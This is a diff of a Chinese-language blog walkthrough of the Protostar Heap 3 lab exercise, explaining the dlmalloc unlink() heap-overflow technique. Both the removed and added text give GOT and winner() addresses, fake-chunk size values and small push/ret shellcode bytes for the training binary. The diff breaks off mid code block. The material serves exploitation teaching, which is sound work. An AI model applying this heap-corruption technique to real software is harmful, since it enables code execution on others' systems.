@@ -5,7 +5,7 @@
 
 <link rel='canonical' href='/p/protostar_heap_3/'>
 
-<link rel="stylesheet" href="/scss/style.min.46f4bd7833d4596a6e839caf393b83bf3fede00131b473e260f83d5a9f629895.css"><meta property='og:title' content='Protostar Heap 3 Walkthrough'>
+<link rel="stylesheet" href="/scss/style.min.66ce53af975830b01002d38d4eb823c7b47d1e58455fb6b3fecbcd684f02b004.css"><meta property='og:title' content='Protostar Heap 3 Walkthrough'>
 <meta property='og:description' content='Basics of dlmalloc and unlink()'>
 <meta property='og:url' content='/p/protostar_heap_3/'>
 <meta property='og:site_name' content='Senri&#39;s Memos'>
@@ -254,7 +254,7 @@ if (!doNotTrack) {
                 Binary
             </a>
         
-            <a href="/categories/heap/" style="background-color: #262626; color: #fff;">
+            <a href="/categories/heap/" style="background-color: #cc8e5b; color: #fff;">
                 Heap
             </a>
         
@@ -308,119 +308,8 @@ if (!doNotTrack) {
     >old malloc implementations</a></p>
 <p><a class="link" href="https://conceptofproof.wordpress.com/2013/11/19/protostar-heap3-walkthrough/"  target="_blank" rel="noopener"
     >Protostar Heap3 Walkthrough | conceptofproof</a></p>
-<p><a class="link" href="https://airman604.medium.com/protostar-heap-3-walkthrough-56d9334bcd13"  target="_blank" rel="noopener"
-    >Protostar Heap 3 Walkthrough | Airman</a></p>
 <p><a class="link" href="https://youtu.be/HWhzH--89UQ"  target="_blank" rel="noopener"
     >The Heap: dlmalloc unlink() exploit - bin 0x18</a></p>
-<p>其实起笔的时候还并不是特别理解</p>
-<p>但是因为思路很乱有点理不清了，所以姑且把已经理解的部分记下来</p>
-<p>然后写着写着就清楚多了x</p>
-<hr>
-<h2 id="dlmalloc-basics-32-bit-x86-architecture">Dlmalloc Basics (32-bit x86 architecture)</h2>
-<p>使用中的 chunk：</p>
-<ul>
-<li><code>prev_size</code>: 4 bytes 用于标注前一个 chunk 的大小</li>
-<li><code>size</code>: 4 bytes 用于标注当前 chunk 的大小，且最后两<strong>比特</strong>用于标记：
-<ol>
-<li>倒数第一位用于标记前一个 chunk 是否被使用</li>
-<li>倒数第二位用于标记当前 chunk 是否已通过 mmap 分配</li>
-</ol>
-</li>
-</ul>
-<blockquote>
-<p><strong>NAME</strong></p>
-<p>mmap, munmap - map or unmap files or devices into memory</p>
-<p><strong>SYNOPSIS</strong></p>
-<p>#include &lt;sys/mman.h&gt;
-void *mmap(void *addr, size_t length, int prot, int flags,
-int fd, off_t offset);
-int munmap(void *addr, size_t length);</p>
-<p>See NOTES for information on feature test macro requirements.</p>
-<p><strong>DESCRIPTION</strong></p>
-<p>mmap() creates a new mapping in the virtual address space of the
-calling process.  The starting address for the new mapping is
-specified in addr.  The length argument specifies the length of
-the mapping (which must be greater than 0).</p>
-</blockquote>
-<pre tabindex="0"><code>    chunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: size of the previous chunk, in bytes (used   |
-             | by dlmalloc only if this previous chunk is free)        |
-             +---------------------------------------------------------+
-             | size: size of the chunk (the number of bytes between    |
-             | &#34;chunk&#34; and &#34;nextchunk&#34;) and 2 bits status information  |
-      mem -&gt; +---------------------------------------------------------+
-             | fd: not used by dlmalloc because &#34;chunk&#34; is allocated   |
-             | (user data therefore starts here)                       |
-             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
-             | bk: not used by dlmalloc because &#34;chunk&#34; is allocated   |
-             | (there may be user data here)                           |
-             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
-             |                                                         .
-             .                                                         .
-             . user data (may be 0 bytes long)                         .
-             .                                                         .
-             .                                                         |
-nextchunk -&gt; + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
-             | prev_size: not used by dlmalloc because &#34;chunk&#34; is      |
-             | allocated (may hold user data, to decrease wastage)     |
-             +---------------------------------------------------------+
-</code></pre><p>已 free 的 chunk：</p>
-<ul>
-<li><code>fd</code>: 4 bytes 指向双向链表的前一个 chunk</li>
-<li><code>bk</code>: 4 bytes 指向双向链表的后一个 chunk</li>
-</ul>
-<pre tabindex="0"><code>    chunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: may hold user data (indeed, since &#34;chunk&#34; is |
-             | free, the previous chunk is necessarily allocated)      |
-             +---------------------------------------------------------+
-             | size: size of the chunk (the number of bytes between    |
-             | &#34;chunk&#34; and &#34;nextchunk&#34;) and 2 bits status information  |
-      mem -&gt; +---------------------------------------------------------+
-             | fd: forward pointer to the next chunk in the circular   |
-             | doubly-linked list (not to the next _physical_ chunk)   |
-             +---------------------------------------------------------+
-             | bk: back pointer to the previous chunk in the circular  |
-             | doubly-linked list (not the previous _physical_ chunk)  |
-             +---------------------------------------------------------+
-             |                                                         .
-             .                                                         .
-             . unused space (may be 0 bytes long)                      .
-             .                                                         .
-             .                                                         |
-nextchunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: size of &#34;chunk&#34;, in bytes (used by dlmalloc  |
-             | because this previous chunk is free)                    |
-             +---------------------------------------------------------+
-</code></pre><p><strong>重点</strong></p>
-<p>如果一个 chunk 即将被 free，那么：</p>
-<ul>
-<li>如果这个 chunk <strong>是</strong>通过 mmap 分配的，那么调用 <code>munmap_chunk()</code></li>
-<li>如果这个 chunk <strong>不是</strong>通过 mmap 分配的，那么调用 <code>chunk_free()</code></li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">INTERNAL_SIZE_T</span> <span class="n">hd</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">...</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hd</span> <span class="o">&amp;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>     <span class="cm">/* consolidate backward */</span>    <span class="cm">/* [A] */</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">	<span class="n">prevsz</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">prevsz</span><span class="p">);</span>                 <span class="cm">/* [B] */</span>
-</span></span><span class="line"><span class="cl">	<span class="n">sz</span> <span class="o">+=</span> <span class="n">prevsz</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	
-</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">		<span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">	<span class="k">else</span>
-</span></span><span class="line"><span class="cl">		<span class="nf">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>在 <code>chunk_free()</code> 函数中，有另一个需要注意的函数：</p>
-<ul>
-<li>如果前一个 chunk 也被 free 了的话，那么会调用  <code>unlink()</code>， 以确保双向链表的准确链接：</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define unlink( P, BK, FD ) {           
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>		<span class="err">\</span>           
-</span></span><span class="line"><span class="cl">    <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>		\
-</span></span><span class="line"><span class="cl">    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>	<span class="err">\</span>                
-</span></span><span class="line"><span class="cl">    <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>	<span class="err">\</span>                       
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>以及，如果 chunk 小于 80 bytes，那么 malloc 会使用另一个简化版的数据结构，被称为 <code>fastbin</code>，而不是上述的双向链表</p>
 <hr>
 <h2 id="heap-three">Heap Three</h2>
 <blockquote>
@@ -459,215 +348,102 @@ nextchunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 </span></span></code></pre></div><hr>
 <h2 id="before-unlink">Before <code>unlink()</code></h2>
 <p>我们的目标是把 <code>puts()</code> 在动态链接表中记录的地址，写上能跳转到 <code>winner()</code> 的 shellcode</p>
-<p>而能帮我们达到以上目的的函数就是 <code>free()</code>， 准确来说是 <code>unlink()</code>，思路如下：</p>
+<p>而能帮我们达到以上目的的函数就是 <code>free()</code>， 准确来说是 <code>unlink()</code></p>
 <br>
-<p>首先，我们所需要的地址有两个：<strong><code>puts()</code> 在 GOT 上的地址</strong> 和 <strong>指向 <code>winner()</code> shellcode 的地址</strong></p>
-<p>而前面提到的 <code>unlink()</code> 是赋值的关键：</p>
-<p>先看一遍完整的代码</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>       
-</span></span><span class="line"><span class="cl"><span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>            
-</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
-</span></span></code></pre></div><p>然后接下来是解释：</p>
-<p><img src="/p/protostar_heap_3/unlink.png"
-	width="1364"
-	height="1206"
-	srcset="/p/protostar_heap_3/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_480x0_resize_box_3.png 480w, /p/protostar_heap_3/unlink_hu024e824d3d83b4bf15fc9447887d5f49_174732_1024x0_resize_box_3.png 1024w"
+<p><em><strong>关于 dlmalloc 的 unlink 漏洞，全部已经移动到了这里：<a class="link" href="/p/dlmalloc_unlink_vuln" >Dlmalloc Unlink Vulnerability</a></strong></em></p>
+<p><em><strong>请看完那篇后再继续向下看</strong></em></p>
+<br>
+<p>如果你看完了那篇，那么再结合一下这道题目，</p>
+<p>heap3 首先依次创建了 chunkA, chunkB, chunkC 然后再反过来依次释放 chunkC, chunkB, chunkA</p>
+<p>所以这道题是「向前 <code>unlink()</code>」</p>
+<p>需要满足的条件：</p>
+<ol>
+<li>
+<p>不是 fastbin</p>
+</li>
+<li>
+<p>不是通过 mmap 分配（已满足）</p>
+</li>
+<li>
+<p><em>Chunk</em> 的 <code>PREV_INUSE</code> 被标记为否</p>
+<p>=&gt; 会对 <em>Chunk</em> 的 <em>相邻上一个 chunk</em> 执行 <code>unlink()</code><br></p>
+</li>
+</ol>
+<p>由于题目中的 <code>malloc()</code> 大小是 <em>32</em>，小于 <em>80</em> 所以会使用 fastbin 结构，所以可以通过上面那篇文章的 <em><strong><a class="link" href="/p/dlmalloc_unlink_vuln/#trick-use-negative-size" >Trick: use negative size</a></strong></em> 章节，使用一个负数：<code>0xfffffffc</code></p>
+<p>那么将 size 设置为 <code>0xfffffffc = -4</code> 就可以满足第一个条件</p>
+<p>但是，如果我们是使用 BufferOverFlow 的方式，从 chunkA 开始去覆写 chunkB 的 size 的话，会导致 prev_size 也被覆盖上，</p>
+<p>而且，既然是「向前 <code>unlink()</code>」，那么 malloc 计算上一个 chunk 的方式是 <code>p - prev_size</code>；如果 prev_size 是乱七八糟的数值，必定会导致 Segmentation fault</p>
+<p>这时候可以再用一次负数，为了区分，就使用 <code>0xfffffff8 = -8</code> 好了：而这样做的效果是，<code>p - prev_size</code> = <code>p - -8</code> = <code>p + 8</code></p>
+<p>也就是说，<em>p</em> 的 <em>prevchunk</em> 出现在了 <em>p</em> 的向后 0x8 的位置：</p>
+<p><img src="/p/protostar_heap_3/fakechunk.png"
+	width="1576"
+	height="930"
+	srcset="/p/protostar_heap_3/fakechunk_hu3a66c77e61e8fc895a1a83be27ed8b8a_220470_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu3a66c77e61e8fc895a1a83be27ed8b8a_220470_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
-		alt="when unlink"
+		alt="fakechunk.png"
 	
 	
 		class="gallery-image" 
-		data-flex-grow="113"
-		data-flex-basis="271px"
+		data-flex-grow="169"
+		data-flex-basis="406px"
 	
 ></p>
-<p>这张图有点迷惑&hellip;就像 <code>P</code> 这个 chunk 左边右边的 <code>BK</code>，<code>FD</code> 原来就存在一样</p>
-<p>可是可是，实际上，这 <code>BK</code> <code>FD</code> 的判断依据是：</p>
-<pre tabindex="0"><code>BK = P-&gt;bk;       
-FD = P-&gt;fd;
-</code></pre><p>所以其实实际上 <code>FD</code> <code>BK</code> 是根据 <code>P</code> 的 <code>P-&gt;fd</code> 和 <code>P-&gt;bk</code> 来决定的</p>
-<p>另外，可以看到，在 <code>unlink()</code> 之后，<code>BK-&gt;fd</code> 指向了 <code>FD</code>，<code>FD-&gt;bk</code> 指向了 <code>BK</code></p>
-<p>但&hellip;换一个思路，前面的示意图里箭头看起来是「指向」，但是反过来，它实际做的事情其实是「赋值」：</p>
-<pre tabindex="0"><code>FD-&gt;bk = BK;            
-BK-&gt;fd = FD;
-</code></pre><p>所以我们的目标就是在原来 <code>P</code> 的 <code>fd</code> 和 <code>bk</code> 处写上别的地址&hellip;就能欺骗 <code>unlink()</code> 给这两个地址赋值&hellip;？请继续往下看</p>
-<hr>
-<p>还记得一个 chunk 的模型么，<code>prev_size</code>, <code>size</code>, <code>fd</code>, <code>bk</code> 都是 4 bytes</p>
-<p>所以出现 <code>P-&gt;fd</code> 时，实际你可以将其看作 <code>P + 0x8</code></p>
-<p>出现 <code>P-&gt;bk</code> 时，实际你可以将其看作 <code>P + 0xc</code></p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th>堆中一个已被 free 的 chunk 的模型</th>
-<th>指针（↑表示在一格的起始处）</th>
-<th>大小</th>
-<th>可以视作</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>prev_size</code></td>
-<td>↑ chunk begins (P)</td>
-<td>4 bytes</td>
-<td>P + 0x0</td>
-</tr>
-<tr>
-<td><code>size</code></td>
-<td></td>
-<td>4 bytes</td>
-<td>P + 0x4</td>
-</tr>
-<tr>
-<td><code>fd</code></td>
-<td>↑ mem begins</td>
-<td>4 bytes</td>
-<td>P + 0x8</td>
-</tr>
-<tr>
-<td><code>bk</code></td>
-<td></td>
-<td>4 bytes</td>
-<td>P + 0xc</td>
-</tr>
-</tbody>
-</table></div>
-<p>如果我们把 <code>P-&gt;bk</code> 换成 <code>addr of shellcode</code>，把 <code>P-&gt;fd</code> 换成 <code>addr of puts()</code></p>
-<p>接下来详细展开一下三四步，等量替换：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">1.</span>
-</span></span><span class="line"><span class="cl"><span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>    
-</span></span><span class="line"><span class="cl"><span class="mf">2.</span>
-</span></span><span class="line"><span class="cl"><span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="mf">3.</span>
-</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="err">↓</span>
-</span></span><span class="line"><span class="cl"><span class="n">BK</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span>
-</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">==</span> <span class="n">FD</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">puts</span><span class="o">+</span><span class="mh">0xc</span>
-</span></span><span class="line"><span class="cl"><span class="err">↓</span>
-</span></span><span class="line"><span class="cl"><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">equals</span>
-</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="n">of</span> <span class="nf">puts</span><span class="p">()</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">=</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="mf">4.</span> 
-</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="err">↓</span>
-</span></span><span class="line"><span class="cl"><span class="n">FD</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">puts</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">BK</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">==</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">==</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span><span class="o">+</span><span class="mh">0x8</span>
-</span></span><span class="line"><span class="cl"><span class="err">↓</span>
-</span></span><span class="line"><span class="cl"><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">equals</span>
-</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="n">of</span> <span class="n">shellcode</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">=</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">puts</span><span class="p">()</span>
-</span></span></code></pre></div><p>出现了！</p>
-<p><code>addr of puts()+0xc</code> = <code>addr of shellcode</code></p>
-<p>这就是我们想要的结果！</p>
-<p>但是还不太对，这边的 <code>addr of puts()</code> 大了 <code>0xC</code>，<strong>所以一开始就应该使 <code>P-&gt;fd</code> = <code>addr of puts() - 0xc</code></strong></p>
-<p>而且在第四步还出现了 <code>addr of shellcode+0x8 = addr of puts()</code>，也就是说这个 shellcode + <code>0x8</code> 的位置会被 <code>unlink()</code> 写上 <code>addr of puts() - 0xc</code>&hellip;</p>
-<p>所以 shellcode 得小于 8 bytes&hellip;？</p>
-<p>另外这张图里的红色绿色箭头看起来是「指向」，但你也应该知道<strong>与红色箭头的相反方向是在「赋值」</strong></p>
-<p><img src="/p/protostar_heap_3/usingunlink.png"
-	width="1026"
-	height="992"
-	srcset="/p/protostar_heap_3/usingunlink_hu6a56f0ff828b81547244061de558feee_167413_480x0_resize_box_3.png 480w, /p/protostar_heap_3/usingunlink_hu6a56f0ff828b81547244061de558feee_167413_1024x0_resize_box_3.png 1024w"
-	loading="lazy"
-	
-		alt="usingunlink"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="103"
-		data-flex-basis="248px"
-	
-></p>
-<p>实际上总体思路已经对了&hellip;但实际实现起来会发现一个小问题&hellip;在倒数第二节会提到</p>
-<hr>
-<p>总之接下来找找到 <code>puts()</code> 在动态链接表里的地址</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:/tmp/heap$ objdump -R /opt/protostar/bin/heap3
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/opt/protostar/bin/heap3:     file format elf32-i386
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">DYNAMIC RELOCATION RECORDS
-</span></span><span class="line"><span class="cl">OFFSET   TYPE              VALUE 
-</span></span><span class="line"><span class="cl">0804b0e4 R_386_GLOB_DAT    __gmon_start__
-</span></span><span class="line"><span class="cl">0804b140 R_386_COPY        stderr
-</span></span><span class="line"><span class="cl">0804b0f4 R_386_JUMP_SLOT   __errno_location
-</span></span><span class="line"><span class="cl">0804b0f8 R_386_JUMP_SLOT   mmap
-</span></span><span class="line"><span class="cl">0804b0fc R_386_JUMP_SLOT   sysconf
-</span></span><span class="line"><span class="cl">0804b100 R_386_JUMP_SLOT   __gmon_start__
-</span></span><span class="line"><span class="cl">0804b104 R_386_JUMP_SLOT   mremap
-</span></span><span class="line"><span class="cl">0804b108 R_386_JUMP_SLOT   memset
-</span></span><span class="line"><span class="cl">0804b10c R_386_JUMP_SLOT   __libc_start_main
-</span></span><span class="line"><span class="cl">0804b110 R_386_JUMP_SLOT   sbrk
-</span></span><span class="line"><span class="cl">0804b114 R_386_JUMP_SLOT   memcpy
-</span></span><span class="line"><span class="cl">0804b118 R_386_JUMP_SLOT   strcpy
-</span></span><span class="line"><span class="cl">0804b11c R_386_JUMP_SLOT   <span class="nb">printf</span>
-</span></span><span class="line"><span class="cl">0804b120 R_386_JUMP_SLOT   fprintf
-</span></span><span class="line"><span class="cl">0804b124 R_386_JUMP_SLOT   <span class="nb">time</span>
-</span></span><span class="line"><span class="cl">0804b128 R_386_JUMP_SLOT   puts
-</span></span><span class="line"><span class="cl">0804b12c R_386_JUMP_SLOT   munmap
-</span></span></code></pre></div><pre tabindex="0"><code>0x0804b128 - 0xc = 0x0804b11c
-</code></pre><p>以及 <code>winner()</code> 的地址：</p>
-<pre tabindex="0"><code>user@protostar:/tmp/heap$ objdump -t /opt/protostar/bin/heap3 | grep winner
-08048864 g     F .text	00000025              winner
-</code></pre><p>把它做成 shellcode，使用<a class="link" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/"  target="_blank" rel="noopener"
-    >这个工具</a></p>
-<pre tabindex="0"><code># x86 (32)
-push 0x08048864
-ret
-
-# Assembly - Little Endian
-&#34;\x68\x64\x88\x04\x08\xc3&#34;
-</code></pre><p>啊..但是差点忘了一件事情，就是我们还没弄出一个 <code>P-&gt;bk</code> = <code>addr of shellcode</code> 且 <code>P-&gt;fd</code> = <code>addr of puts() - 0xc</code> 的 chunk 呢&hellip;</p>
+<p>至此，我们成功伪造了 chunkB 的 prevchunk，</p>
+<p>而这个 prevchunk 的 fd 的位置是 <code>p - prev_size + 0x8</code></p>
+<p>也就是 <em>p</em> 向后偏移 0x10 的位置</p>
+<p>而 bk 的话再偏移 0x4 也就是 <em>p + 0x14</em></p>
 <hr>
 <h2 id="create-a-fake-chunk">Create a fake chunk</h2>
-<p>首先 <code>strcpy()</code> 不会检查字符数量，所以可以在堆上写多于 <code>malloc(32)</code> 的字符</p>
-<p>我们现在要创建一个这样的 chunk：</p>
-<pre tabindex="0"><code>    chunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-             | prev_size: no idea                                      |
-             +---------------------------------------------------------+
-             | size: no idea                                           |
-      mem -&gt; +---------------------------------------------------------+
-             | fd: addr of puts() minus 0x12                           |
-             +---------------------------------------------------------+
-             | bk: addr of shellcode                                   |
-             +---------------------------------------------------------+
-</code></pre><p>而且我们必须要让 <code>unlink()</code> 这个函数被执行&hellip;这就出现了两个先决条件：</p>
-<ol>
-<li>前一个 chunk 也得是被 free 了的</li>
-<li>这个 chunk 和 前一个 chunk 的 <code>size</code> 都得大于 80 bytes 不然就会使用 <code>fastbin</code> 而不是双向链表</li>
-</ol>
-<br>
-<p>还记得 malloc 标记前一个 chunk 是否被 free 的方法是：看 <code>size</code> 的最后一个比特是否被设为零，设为零即「前一个 chunk 已被 free」</p>
-<p>所以我们需要伪造一个 chunk size&hellip;需要大于 80 bytes 而且最后一个比特为零&hellip;</p>
-<p>这里有一个很聪明的做法&hellip;可以用负数，比如 <code>0xfffffffc</code> 即 <code>-4</code></p>
-<br>
-<p>而且这个 <code>0xfffffffc = -4</code> 能导致两个很有趣的特性：</p>
-<ol>
-<li>
-<p>不含 null byte</p>
-</li>
-<li>
-<p>malloc 计算下一个 chunk 的位置的方式是：<code>P + size</code><br>
-那么 <code>P + (-4)</code> = <code>P - 4</code>，就是说下一个 chunk 出现在了当前 chunk 的向前 4 bytes&hellip;</p>
-</li>
-</ol>
-<p><code>prev_size</code> 同理&hellip;姑且为了区分就设为 <code>0xfffffff8</code> 也就是 <code>-8</code> ，那么上一个 chunk 出现在了当前 chunk 的向后 8 bytes</p>
-<p>结果就是，我们不需要浪费堆上很多的地址，只要在很小的一段空间里就能伪造出 BK 和 FD</p>
-<p><img src="/p/protostar_heap_3/fakechunk.png"
-	width="1522"
-	height="992"
-	srcset="/p/protostar_heap_3/fakechunk_hu6ac2e7c3e3bc9a548d253792e3254835_229910_480x0_resize_box_3.png 480w, /p/protostar_heap_3/fakechunk_hu6ac2e7c3e3bc9a548d253792e3254835_229910_1024x0_resize_box_3.png 1024w"
+<p>首先，我们所需要的地址有两个：<strong><code>puts()</code> 在 GOT 上的地址</strong> 和 <strong>指向 <code>winner()</code> shellcode 的地址</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@protostar:/tmp# objdump -R /opt/protostar/bin/heap3 <span class="p">|</span> grep puts
+</span></span><span class="line"><span class="cl">0804b128 R_386_JUMP_SLOT   puts
+</span></span><span class="line"><span class="cl">root@protostar:/tmp# objdump -t /opt/protostar/bin/heap3 <span class="p">|</span> grep winner
+</span></span><span class="line"><span class="cl"><span class="m">08048864</span> g     F .text	<span class="m">00000025</span>              winner
+</span></span></code></pre></div><p>我们可以把 <code>push 0x08048864 ret</code> 写在 chunkA 的开头，那么地址就是（这里我当然是用了 gdb proc map 看堆到底在哪里的）就是 <code>0x804c008</code></p>
+<p>那么使用前面的公式：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">令 <span class="nv">fd</span> <span class="o">=</span> addr of func - 0xc
+</span></span><span class="line"><span class="cl">令 <span class="nv">bk</span> <span class="o">=</span> addr of shllcode
+</span></span><span class="line"><span class="cl">那么
+</span></span><span class="line"><span class="cl">我们所想要的：
+</span></span><span class="line"><span class="cl">fd + <span class="nv">0xc</span> <span class="o">=</span> addr of shllcode
+</span></span><span class="line"><span class="cl">我们必须得纳入考虑并避免的：
+</span></span><span class="line"><span class="cl">bk + <span class="nv">0x8</span> <span class="o">=</span> addr of func
+</span></span></code></pre></div><p>换成这道题的地址：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">令 <span class="nv">fd</span> <span class="o">=</span> addr of func - <span class="nv">0xc</span>
+</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; <span class="nv">fd</span> <span class="o">=</span> addr of puts - <span class="nv">0xc</span> <span class="o">=</span> 0x0804b11c
+</span></span><span class="line"><span class="cl">令 <span class="nv">bk</span> <span class="o">=</span> addr of <span class="nv">shllcode</span>
+</span></span><span class="line"><span class="cl"><span class="o">=</span>&gt; <span class="nv">bk</span> <span class="o">=</span> 0x804c008
+</span></span><span class="line"><span class="cl">那么
+</span></span><span class="line"><span class="cl">我们所想要的：
+</span></span><span class="line"><span class="cl">fd + <span class="nv">0xc</span> <span class="o">=</span> addr of shllcode
+</span></span><span class="line"><span class="cl">我们必须得纳入考虑并避免的：
+</span></span><span class="line"><span class="cl">bk + <span class="nv">0x8</span> <span class="o">=</span> addr of puts
+</span></span></code></pre></div><p>关于制作 shellcode，可以使用<a class="link" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/"  target="_blank" rel="noopener"
+    >这个工具</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># x86 (32), Little Endian</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x08048864 is the address of winner</span>
+</span></span><span class="line"><span class="cl">push 0x08048864
+</span></span><span class="line"><span class="cl">ret
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Assembly - Little Endian</span>
